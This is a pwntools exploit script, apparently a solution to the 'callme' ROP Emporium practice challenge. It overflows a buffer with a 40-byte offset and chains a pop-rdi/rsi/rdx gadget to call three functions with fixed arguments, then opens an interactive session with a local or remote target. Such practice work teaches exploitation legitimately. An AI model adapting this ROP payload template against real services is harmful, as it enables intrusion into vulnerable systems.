#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './callme'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
pppr = 0x0000000000401ab0 # pop rdi ; pop rsi ; pop rdx ; ret
callme_three = 0x401810
callme_two = 0x401870
callme_one = 0x401850

# rop1
offset = 40
payload = '\0'*offset
payload += p64(pppr+3)
payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_one)
payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_two)
payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_three) 

debug()
sl(payload)

p.interactive()

